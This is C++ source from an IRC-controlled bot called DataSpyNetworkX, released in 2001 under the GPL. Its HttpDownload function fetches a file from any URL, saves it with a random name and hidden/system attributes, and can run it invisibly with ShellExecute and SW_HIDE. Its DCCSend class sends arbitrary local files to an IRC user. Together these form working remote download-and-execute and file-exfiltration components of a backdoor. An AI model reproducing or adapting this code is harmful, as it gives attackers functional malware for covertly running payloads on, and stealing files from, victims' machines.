/* 
	DataSpyNetworkX - DataSpy2k@Hotmail.com  Copyright (C) 2001 DataSpy
	Release Source 0.4Beta.

	In no event will the author be held liable for any damages arising from the use of this code. 

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/
#include "..\include\globals.h"
#include "..\include\base.h"
#include "..\include\tcp.h"
#include "..\include\iohandler.h"
#include "..\include\file.h"

char cHTTP[] = "http://\0";

void HttpDownload(char* cReply,char *cInUrl,BOOL bExecute)
{
	sprintf(cReply,"Bad URLr\0");

	if ( strnicmp(cHTTP,cInUrl,7) != 0 )
		return;
	
	char *cUrl = strcpy(new char[lstrlen(cInUrl)-7],cInUrl+7);
	
	char *cServer=cUrl,*cResource;
	
	if ( (cResource = BreakString(cUrl,"/\0")) == NULL ) 
		return;

	SOCKET The_Socket = 0;
	if ( (The_Socket = SocketOpen(80,cServer,NULL) ) == -1 )	
	{
		sprintf(cReply,"Error Connecting to %sr\0",cServer);
		return;
	}
//
//Send command to http server to retreive file
//	
	char *cRequest = new char [64 + (lstrlen(cServer) * 2) + lstrlen(cResource)];

	sprintf(cRequest,"GET %s%s/%s HTTP/1.1\r\nHOST: %s\r\n\r\n\0",cHTTP,cServer,cResource,cServer);
	EasySSend(The_Socket,cRequest);

	delete cRequest;
//
//Get header from http server
//	
	unsigned long iLen =0;
	int iWaited =0;
	char *cHeader = NULL;
	
	do {
		Sleep(500);
		iWaited++;
		iLen = SocketRecv(The_Socket,&cHeader);
	} while (iLen == 0 && iWaited < 10);

	if (iLen <= 0) 
	{
		sprintf(cReply,"Error Header Never Receivedr\0");
		closesocket(The_Socket);
		return;
	}
//
//Check if the reply is "yes"
//	
	if (strncmp(" 200 OK",cHeader + 8,7) !=0) 
	{
		int iGo=0;
		
		while (cHeader[iGo] != '\n' && cHeader[iGo] != 0)	iGo++;
		cHeader[iGo] = '\0';
		
		sprintf(cReply,"Error :%sr\0",cHeader);
		
		free(cHeader);
		closesocket(The_Socket);
		
		return;
	}
//
//Get the length of the file
//
	char *LenID = strstr(cHeader,"Content-Length:");
	if (LenID == NULL) LenID = strstr(cHeader,"ength:"); //Blah compatibility sucks
	
	if (LenID == NULL) //Length not found..
	{ 
		sprintf(cReply,"Error File Length Not Determinedr\0");
		closesocket(The_Socket);
		return;
	}
//		
//Generate a random named exe to save file to
//
	char *cFileName;
if (bExecute)
{
	cFileName = new char[16];
	
	char *cFilePrefix = RandomText(9);	

	char *cEnd = cInUrl + lstrlen(cInUrl) - 3;

	sprintf(cFileName,"%s.%s\0",cFilePrefix,cEnd); 
	
	delete cFilePrefix;
}else
{
	cFileName = new char [lstrlen(cInUrl)];
	sprintf(cFileName,cInUrl);
}
//
//Figure out how much of the file we already got from the header
//
	
	char *cAlign = BreakString(LenID,"\r\n\r\n\0");
	
	unsigned long iSize	= atoi(strstr(LenID,":\0") + 1),
		iDownloaded = (iLen - (cAlign - cHeader));
//
//Open file on disk, and write the incoming data to the file
//	
	HANDLE fFile;

	if ( (fFile = CreateFile(cFileName,GENERIC_WRITE,0,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM,NULL) ) == INVALID_HANDLE_VALUE) 
	{
		sprintf(cReply,"Error: Unable To Open Output Filer\0");
		closesocket(The_Socket);
		delete cFileName;
		return;
	}
	DWORD dwWritten;
	WriteFile(fFile,cAlign,iDownloaded,&dwWritten,NULL);
	
	DWORD dwLen;
	fd_set rfds;
	TIMEVAL tm; tm.tv_sec=0; tm.tv_usec=0;
	
	while (iDownloaded < iSize)
	{
		Sleep(50);
		FD_ZERO(&rfds);
		FD_SET(The_Socket,&rfds);
		
		if(select(0,&rfds,NULL,NULL,&tm)>0) 
		{		
			//if(FD_ISSET(The_Socket,&rfds)) {
			
			ioctlsocket(The_Socket,FIONREAD,&dwLen);
	
			if(dwLen<=0) break; //Socket Error!
			
			char *buffer=(char *)malloc(dwLen);
			
			if(buffer!=NULL)  //Did we have the memory allocated?
			{
				dwLen = recv(The_Socket,buffer,dwLen,0);
				if(dwLen>0) WriteFile(fFile,buffer,dwLen,&dwWritten,NULL);
				free(buffer);								
			}
			
			iDownloaded += dwWritten;
		}			
	} 		//}

	CloseHandle(fFile);
	closesocket(The_Socket);

	if (iDownloaded != iSize) //Didnt download all of the file
	{
		sprintf(cReply,"Failed To Downloaded File (%i of %i Bytes)r\0",iDownloaded,iSize);
	}
	else 
	{
		if (bExecute)
		{
			if((int)ShellExecute(g_hwnd, "open",cFileName, "\0", "\0",SW_HIDE) > 31)
			{
				sprintf(cReply,"Downloaded And Opened File (%i Bytes)b\0",iDownloaded);
			}
			else
			{
				sprintf(cReply,"Downloaded But Failed To Executed File (%i Bytes)r\0",iDownloaded);
			}
		}
		else
		{
			sprintf(cReply,"Downloaded File (%i Bytes)r\0",iDownloaded);
		}
	}

	return;
}

//        USER                 FileName         LocalIP   PORT BYTES
//PRIVMSG dataspy :\01DCC SEND EditServer1.exe 2130706433 4556 208896\01
//DCCSend(char *cReply,char *cWho,char *cWhat);
//:DataSpy!~Grinder@unknown-16729 NOTICE blah :DCC Send DSNX0.3B.rar (127.0.0.1)
//:DataSpy!~Grinder@unknown-16729 PRIVMSG blah :?DCC SEND DSNX0.3B.rar 2130706433 1500 135323?

DCCSend::DCCSend (char *cReply,char *cWho,char *cFileOnDisk,char *cDesiredFileName,long localIp)
{
	this->Status.Enabled = TRUE;
	this->Type = FT; //Im a file transfer
	this->iPort = Random (2000,25000);
	if (cFileOnDisk == NULL) 
	{
		delete this;
		return;
	}

	if( (fFile = CreateFile(cFileOnDisk,GENERIC_READ,0,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL)) !=INVALID_HANDLE_VALUE)
	{
		this->iSize = GetFileSize(fFile,NULL);

		if (cDesiredFileName == NULL)
		{
			char *cR =NULL;
			
			if ((cR = strrchr( cFileOnDisk, '/')) == NULL)	cR = strrchr( cFileOnDisk, '\\');
		
			if (cR != NULL)
				cDesiredFileName = cR +1;
			else
				cDesiredFileName = cFileOnDisk;
		}else 
			if (strstr(cDesiredFileName,"random"))
			{
				char *cnew = new char[128],*end;
				if ((end=strrchr(cFileOnDisk,'.')))
					sprintf(cnew,"%s.%s",RandomText(),end+1);
				cDesiredFileName = cnew;
			}

		sprintf(cReply,"Sending %s\n%s%s :\x01\DCC SEND %s %lu %i %i\x01\x62\0",
		cFileOnDisk,c_PRIVMSG,cWho,cDesiredFileName,htonl(localIp),iPort,iSize);
	}
	else
	{
		sprintf(cReply,"Error Opening %sr\0",cFileOnDisk);
		delete this;
		return;
	}

	if (!g_IOSock->Insert(this))
	{
		sprintf(cReply,c_OUT_OF_IOHANDLERS);
		delete this;
		return;
	}
	
	this->iSocket = SocketListen(this->iPort,this->GetMessageID());
}
DCCSend::~DCCSend ()
{
	this->Status.Enabled = FALSE;
	Sleep(250); //Let it exit
}

#define DCC_READ 4096 //Buffer size
#define SEND_AHEAD 3  //Number of buffers to send before stopping and waiting for the receiver to catch up

void DCCSend::Accept(SOCKET iCheckSocket)
{
	SOCKET The_Socket = SocketAccept(iCheckSocket,NULL);

	char *buf = new char[DCC_READ];
	long iSend = this->iSize;

	TIMEVAL tm;
	DWORD dwLen,dwRead;
	fd_set rfds;
	
	long iACK=0;

	closesocket(this->GetSocketNum());
 
	while (this->Status.Enabled && this->iSize > DCC_READ )
	{
		tm.tv_sec=0;
		tm.tv_usec=0;
		FD_ZERO(&rfds);
		FD_SET(The_Socket,&rfds);
		
		if(select(0,&rfds,NULL,&rfds,&tm)>0) //Have we received any confirmation?
		{	
			ioctlsocket(The_Socket,FIONREAD,&dwLen);
			if(dwLen<=0) break;
			while (dwLen >= 4)
			{
				recv(The_Socket,(char*)&iACK,4,0);	
				dwLen -=4;
			}
			iACK = ntohl(iACK);
		}
		
		while (iACK >= iSend - this->iSize - (DCC_READ * SEND_AHEAD) && this->iSize > DCC_READ)
		{
			ReadFile(this->fFile,buf,DCC_READ,&dwRead,NULL);
			SocketSend(The_Socket,buf,dwRead);
			this->iSize -= dwRead;
		}
		Sleep(20);
	}

	if (this->iSize <= DCC_READ)
	{
		ReadFile(this->fFile,buf,this->iSize,&dwRead,NULL);
		SocketSend(The_Socket,buf,dwRead);
	}
	closesocket(The_Socket);
	CloseHandle(this->fFile);
	g_IOSock->Remove(g_IOSock->GetIdFromPointer(this));

}